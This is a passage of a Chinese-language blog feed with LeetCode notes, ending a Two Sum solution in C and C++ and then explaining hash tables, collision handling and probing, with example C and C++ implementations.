&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hashTable</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> key;</span><br><span class="line">        <span class="type">int</span> value;</span><br><span class="line">        UT_hash_handle hh;</span><br><span class="line">    &#125; *hashTable = <span class="literal">NULL</span>, *item;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++) &#123;</span><br><span class="line">        <span class="type">int</span> complement = target - nums[i];</span><br><span class="line">        HASH_FIND_INT(hashTable, &amp;complement, item);</span><br><span class="line">        <span class="keyword">if</span> (item) &#123;</span><br><span class="line">            <span class="type">int</span>* result = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">2</span>);</span><br><span class="line">            result[<span class="number">0</span>] = item-&gt;value;</span><br><span class="line">            result[<span class="number">1</span>] = i;</span><br><span class="line">            *returnSize = <span class="number">2</span>;</span><br><span class="line">            HASH_CLEAR(hh, hashTable);  <span class="comment">// Free the hash table</span></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        item = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> hashTable));</span><br><span class="line">        item-&gt;key = nums[i];</span><br><span class="line">        item-&gt;value = i;</span><br><span class="line">        HASH_ADD_INT(hashTable, key, item);</span><br><span class="line">    &#125;</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    HASH_CLEAR(hh, hashTable);  <span class="comment">// Free the hash table</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡就是將插入 hashtable 和檢查 complement 併入同一個迭代中，但由於還是迭代了 n 個元素，因此時間複雜度一樣是 $O(n)$</p><blockquote><p>這裡我也開始考慮改成學習使用 C++ 來刷題XD，C++ 像這種題目就有很多好用的 STL  <code>unordered_map</code> 能夠直接使用，不需要重新設計太多東西。</p></blockquote><h1 id="C-的解法"><a href="#C-的解法" class="headerlink" title="C++ 的解法"></a>C++ 的解法</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; hash;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            hash[nums[i]] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="type">int</span> complement = target - nums[i];</span><br><span class="line">            <span class="keyword">if</span> (hash.<span class="built_in">find</span>(complement) != hash.<span class="built_in">end</span>() &amp;&amp; hash[complement] != i) &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;i, hash[complement]&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Array </tag>
            
            <tag> LeetCode </tag>
            
            <tag> Hash Table </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題必備神器 | 雜湊表 (Hash Table) | LeetCode 筆記</title>
      <link href="/posts/ef71152b.html"/>
      <url>/posts/ef71152b.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本介紹"><a href="#基本介紹" class="headerlink" title="基本介紹"></a>基本介紹</h1><p>雜湊表是一種 Key Value Mapping 的結構，可以用快速查找資料，相較於一般搜尋演算法的時間複查度 $O(Log n)$ 他時間複雜度會是 $O(1)$</p><p>主要神速的原因是因為 Hash Function，如果先把 n 個數字儲存在 Hash Table 裡面，那如果要判斷這個數字 A 是不是已經被存在 Hash Table 裡面，只要先把這個數字丟進 hash function，就可以直接知道 A 對應到 Hash Table 中哪一格。</p><h3 id="Hash-Table-不適合使用的時機"><a href="#Hash-Table-不適合使用的時機" class="headerlink" title="Hash Table 不適合使用的時機"></a>Hash Table 不適合使用的時機</h3><ul><li>資料有處理上的時間優先順序，這種比較適合 Queue (FIFO)的結構</li><li><strong>如果資料想要被排序，那也不適合用 Hash Table</strong><ul><li><a href="https://www.reddit.com/r/learnprogramming/comments/29t4s4/when_is_it_bad_to_use_a_hash_table/">https://www.reddit.com/r/learnprogramming/comments/29t4s4/when_is_it_bad_to_use_a_hash_table/</a></li></ul></li></ul><h3 id="Hash-Table-適合的使用條件"><a href="#Hash-Table-適合的使用條件" class="headerlink" title="Hash Table 適合的使用條件"></a>Hash Table 適合的使用條件</h3><ul><li>題目要求使用時間複雜度 $O(1)$  的演算法來存取元素</li><li>最糟的狀況也有 $O(n)$ 時間複雜度</li></ul><h1 id="Hash-Function"><a href="#Hash-Function" class="headerlink" title="Hash Function"></a>Hash Function</h1><p>一個 hash function 要成立會有三中條件</p><ol><li>hash function 計算出來的值是非負整數</li><li>如果 key1 &#x3D; key2 ，則 <code>hash (key1) = hash (key2)</code></li><li>如果 key1 ≠ key2 ，則 <code>hash (key1) ≠ hash (key2)</code></li></ol><p>需要要注意的點是，在多筆資料放在同個空間容易發生<strong>碰撞(collision)<strong>，</strong>load factor</strong> 就是用來衡量碰撞發生的因子<br>    - $load factor &#x3D; n &#x2F; m$<br>    - $n$  &#x3D;  輸入資料個數<br>    - $m$ &#x3D;  雜湊表的大小<br>    - 如果 $load factor &gt; 1$ 則很可能發生碰撞<br>        - <a href="https://zh.wikipedia.org/wiki/%E9%B4%BF%E5%B7%A2%E5%8E%9F%E7%90%86">https://zh.wikipedia.org/wiki/鴿巢原理</a><br>        - 白話文解釋就是如果 n &gt; m 那必定有資料要跟別的資料住在同個桶子裡</p><h2 id="Hash-Function-的實作方式-（除法-儲存方式用陣列）"><a href="#Hash-Function-的實作方式-（除法-儲存方式用陣列）" class="headerlink" title="Hash Function 的實作方式 （除法, 儲存方式用陣列）"></a>Hash Function 的實作方式 （除法, 儲存方式用陣列）</h2><p>首先可以定義每筆資料在雜湊表中的索引值 (index)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index = key % m        <span class="comment">// 0 &lt;= index &lt; m </span></span><br></pre></td></tr></table></figure><p>範例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A ( Key = 11324)</span><br><span class="line"></span><br><span class="line">B ( Key = 6356)</span><br><span class="line"></span><br><span class="line">C ( Key = 345)</span><br><span class="line"></span><br><span class="line">D ( key = 4171 )</span><br></pre></td></tr></table></figure><p>M (雜湊表大小)&#x3D; 6, 則雜湊表的 index 會如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Index of A :  11324 % 6 = 2</span><br><span class="line"></span><br><span class="line">Index of B:   6356 % 6 = 2</span><br><span class="line"></span><br><span class="line">Index of C:  345 % 6 = 3</span><br><span class="line"></span><br><span class="line">Index of D: 4171 % 6 =1</span><br></pre></td></tr></table></figure><p>可以發現到 A 與 B 發生碰撞，這會與 m  的選擇有關，m 的選擇要盡可能元離 $2^p$  越遠越好</p><p><img src="/img/LeetCode/HashTable/hashtable.drawio.png"></p><h3 id="Hash-Function的實作-（乘法-儲存方式用陣列）"><a href="#Hash-Function的實作-（乘法-儲存方式用陣列）" class="headerlink" title="Hash Function的實作 （乘法, 儲存方式用陣列）"></a>Hash Function的實作 （乘法, 儲存方式用陣列）</h3><p>$index &#x3D; [ m \cdot ((key \cdot A) \mod 1) ]$</p><p>$0 ≤  index &lt; (m-1)$</p><p>步驟：</p><ul><li>Key 乘上一個小於 1 的無理數，即 Ａ， A 通常會選擇  $\frac{\sqrt5 -1}{2}$  ，乘完後會得到一個更大的無理數</li><li>將這個無理數去跟 1 取餘數，這麼做也會將無理數的整數部分去除，僅剩下小數</li><li>m 乘上小數，這一步會得到一個 $0$ 與 ($m-1)$ 之間 的 無理數</li><li>透過高斯符號對無理數去取整數<ul><li><a href="https://zh.wikipedia.org/wiki/%E5%8F%96%E6%95%B4%E5%87%BD%E6%95%B0">https://zh.wikipedia.org/wiki/取整函数</a></li></ul></li></ul><blockquote><p>下面的圖講解得挺好<br>圖來源: <a href="https://medium.com/@ralph-tech/%E8%B3%87%E6%96%99%E7%B5%90%E6%A7%8B%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-%E9%9B%9C%E6%B9%8A%E8%A1%A8-hash-table-15f490f8ede6">https://medium.com/@ralph-tech/%E8%B3%87%E6%96%99%E7%B5%90%E6%A7%8B%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98-%E9%9B%9C%E6%B9%8A%E8%A1%A8-hash-table-15f490f8ede6</a></p></blockquote><p><img src="/img/LeetCode/HashTable/hashfunction.png"></p><p>這麼繁瑣求 index 的方法有什麼優點：</p><ul><li>沒有 m 要遠離 $2^p$ 的限制</li><li>可以提高隨機性</li></ul><h1 id="如何處理尋址衝突？"><a href="#如何處理尋址衝突？" class="headerlink" title="如何處理尋址衝突？"></a>如何處理尋址衝突？</h1><h2 id="1-Seperate-Chaining-x2F-Close-Addressing"><a href="#1-Seperate-Chaining-x2F-Close-Addressing" class="headerlink" title="1.  Seperate Chaining &#x2F; Close Addressing"></a>1.  Seperate Chaining &#x2F; Close Addressing</h2><p>在每個儲存空間中再生成新的鏈狀儲存空間，可以用 Linked List 或者是 Array 來實現</p><p><img src="/img/LeetCode/HashTable/hashtable-linkedlist.png"></p><p>由於需要額外的指標，如果存儲的資料大小小於一個指標，那麼使用鏈結串列會消耗雙倍的記憶體來存儲資料。然而，如果要存儲的資料遠大於一個指標的大小，指標的額外消耗就可以忽略不計了。事實上，我們可以對鏈結串列進行改造，讓其後端結合紅黑樹、跳表等資料結構，這樣最終 Hash Table 的查找時間只需要 $O(log n)$</p><p>這種結構適合存儲大量資料且每筆資料較大的情況，而且它還支持更多樣的優化策略，可以結合紅黑樹等一起使用。</p><h2 id="2-Open-Addressing"><a href="#2-Open-Addressing" class="headerlink" title="2. Open Addressing"></a>2. Open Addressing</h2><p>Open Addressing 主要透過 <strong>probing</strong> 的方式來尋找未儲存資料的空間，可以分成：</p><ul><li>Linear Probing</li><li>Quadratic probing</li></ul><h3 id="Linear-Probing"><a href="#Linear-Probing" class="headerlink" title="Linear Probing"></a>Linear Probing</h3><p>遇到衝突時，檢查下一個索引位置是否空閒，如果是空的就放入資料，如果不是就繼續往下找。當要尋找元素時，如果遇到衝突，也需要向後搜尋，直到找到一個空的位置才停止搜尋。</p><p><strong>缺點</strong>：Hash Table 支援刪除操作，但被刪除的元素需要標記，否則直接刪除會導致後續的搜尋過程被中斷。</p><h3 id="Quadratic-probing"><a href="#Quadratic-probing" class="headerlink" title="Quadratic probing"></a>Quadratic probing</h3><p>可以用來解決 Linear Probing 效率低，Linear Probing 在插入元素多的時候，在尋址時也會效率緩慢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash(key)+<span class="number">1</span>, hash(key)+<span class="number">2</span>, hash(key)+<span class="number">3</span>,…..hash(key)+n</span><br></pre></td></tr></table></figure><p>所以在 Quadratic probing 的時候將尋址方式改成：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash(key)+ <span class="number">1</span>^<span class="number">2</span> , hash(key)+ <span class="number">2</span>^<span class="number">2</span>, hash(key)+<span class="number">3</span>^<span class="number">2</span></span><br></pre></td></tr></table></figure><p>每次都增加 <code>n^2</code> 來找空位址</p><h3 id="Double-hashing"><a href="#Double-hashing" class="headerlink" title="Double hashing"></a>Double hashing</h3><p>另外，若有衝突發生，也可以直接再跑另一個 Hash Function，也就是當衝突發生時，<strong>持續進行hash 直到衝突結束</strong></p><p>$index_{n} &#x3D; F_{1}(k) + (n-1)* F_{2}(k)$ 直到找到最後的 index為止</p><h3 id="開放尋址法的優缺點："><a href="#開放尋址法的優缺點：" class="headerlink" title="開放尋址法的優缺點："></a>開放尋址法的優缺點：</h3><p><strong>優點：</strong></p><p>Open addressing 方法不使用鏈結串列，所有資料都存放在 Array 中，有助於通過快取加快存取速度。</p><p><strong>缺點：</strong></p><p>刪除資料較為麻煩，需要特別標記要刪除的數據。<br>所有資料都存放在同一個 hash table 中，發生衝突的代價較高，因此 load factor 不宜太高，這使得這種方法比較浪費記憶體。</p><h1 id="Hash-Table-實作"><a href="#Hash-Table-實作" class="headerlink" title="Hash Table 實作"></a>Hash Table 實作</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">// in order to use bool function in C</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_NAME 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TABLE_SIZE 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> name[MAX_NAME];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;person; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">person *hash_table[TABLE_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">char</span> *name)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init_hash_table</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_table</span><span class="params">()</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_insert</span><span class="params">(person *p)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_delete</span><span class="params">(person *p)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init_hash_table();</span><br><span class="line"></span><br><span class="line">    person Walt=&#123;.name=<span class="string">&quot;Walt&quot;</span>,.age=<span class="number">26</span>&#125;;</span><br><span class="line">    person Skyler=&#123;.name=<span class="string">&quot;Skyler&quot;</span>,.age=<span class="number">27</span>&#125;;</span><br><span class="line">    person Saul=&#123;.name=<span class="string">&quot;Saul&quot;</span>,.age=<span class="number">28</span>&#125;;</span><br><span class="line">    person Mike=&#123;.name=<span class="string">&quot;Mike&quot;</span>,.age=<span class="number">29</span>&#125;;</span><br><span class="line">    person Hank=&#123;.name=<span class="string">&quot;Hank&quot;</span>,.age=<span class="number">30</span>&#125;;</span><br><span class="line">    person Mary=&#123;.name=<span class="string">&quot;Mary&quot;</span>,.age=<span class="number">31</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//add person into hash_table</span></span><br><span class="line">    hash_table_insert(&amp;Walt);</span><br><span class="line">    hash_table_insert(&amp;Skyler);</span><br><span class="line">    hash_table_insert(&amp;Saul);</span><br><span class="line">    hash_table_insert(&amp;Mike);</span><br><span class="line">    hash_table_insert(&amp;Hank);</span><br><span class="line">    hash_table_insert(&amp;Mary);</span><br><span class="line"></span><br><span class="line">    print_table();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//delete persion in hash table</span></span><br><span class="line">    hash_table_delete(&amp;Walt);</span><br><span class="line">    print_table();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//define the hash function</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(<span class="type">char</span> *name)</span>&#123;</span><br><span class="line">    <span class="type">int</span> length=strnlen(name, MAX_NAME);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> hash_value=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">        hash_value+=name[i];</span><br><span class="line">        hash_value=(hash_value*name[i])%TABLE_SIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//initialize the hash table to NULL (let it be empty)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_hash_table</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;TABLE_SIZE;i++)&#123;</span><br><span class="line">        hash_table[i]=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//print out the hash table</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_table</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------Start--------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;TABLE_SIZE;i++)&#123;</span><br><span class="line">        <span class="comment">//nothing in the hash table</span></span><br><span class="line">        <span class="keyword">if</span>(hash_table[i]==<span class="literal">NULL</span>) <span class="built_in">printf</span>(<span class="string">&quot;\t%d\t---\n&quot;</span>,i);</span><br><span class="line">        <span class="comment">//something in the hash table</span></span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;\t%d\t%s\n&quot;</span>,i,hash_table[i]-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------End----------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//insert the element into the hash_table</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_insert</span><span class="params">(person *p)</span>&#123;</span><br><span class="line">    <span class="comment">//make sure not call this function with null ptr</span></span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//insert the person into the index return by hash_function</span></span><br><span class="line">    <span class="type">int</span> index=hash(p-&gt;name);</span><br><span class="line">    <span class="comment">//check the pointer at that index in the table is null or not</span></span><br><span class="line">    <span class="keyword">if</span>(hash_table[index]!=<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//collision, somebody had occupied there already</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//if no one occupied there, then occupied the address</span></span><br><span class="line">    hash_table[index]=p;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">hash_table_delete</span><span class="params">(person *p)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// to avoid null ptr</span></span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get index</span></span><br><span class="line">    <span class="type">int</span> index=hash(p-&gt;name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hash_table[index]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        hash_table[index] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果使用 C++　STL 再刷題時會方便更多:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    string name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">unordered_map&lt;string, Person&gt; hash_table;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_hash_table</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_table</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hash_table_insert</span><span class="params">(<span class="type">const</span> Person&amp; p)</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hash_table_delete</span><span class="params">(<span class="type">const</span> string&amp; name)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">init_hash_table</span>();</span><br><span class="line"></span><br><span class="line">    Person Walt = &#123;.name = <span class="string">&quot;Walt&quot;</span>, .age = <span class="number">26</span>&#125;;</span><br><span class="line">    Person Skyler = &#123;.name = <span class="string">&quot;Skyler&quot;</span>, .age = <span class="number">27</span>&#125;;</span><br><span class="line">    Person Saul = &#123;.name = <span class="string">&quot;Saul&quot;</span>, .age = <span class="number">28</span>&#125;;</span><br><span class="line">    Person Mike = &#123;.name = <span class="string">&quot;Mike&quot;</span>, .age = <span class="number">29</span>&#125;;</span><br><span class="line">    Person Hank = &#123;.name = <span class="string">&quot;Hank&quot;</span>, .age = <span class="number">30</span>&#125;;</span><br><span class="line">    Person Mary = &#123;.name = <span class="string">&quot;Mary&quot;</span>, .age = <span class="number">31</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add persons into hash_table</span></span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Walt);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Skyler);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Saul);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Mike);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Hank);</span><br><span class="line">    <span class="built_in">hash_table_insert</span>(Mary);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print_table</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Delete person from hash table</span></span><br><span class="line">    <span class="built_in">hash_table_delete</span>(<span class="string">&quot;Walt&quot;</span>);</span><br><span class="line">    <span class="built_in">print_table</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_hash_table</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    hash_table.<span class="built_in">clear</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_table</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;--------Start--------&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; pair : hash_table) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; pair.first &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; pair.second.name &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;--------End----------&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hash_table_insert</span><span class="params">(<span class="type">const</span> Person&amp; p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> result = hash_table.<span class="built_in">insert</span>(&#123;p.name, p&#125;);</span><br><span class="line">    <span class="keyword">return</span> result.second; <span class="comment">// True if insertion took place, false if key already existed</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hash_table_delete</span><span class="params">(<span class="type">const</span> string&amp; name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> 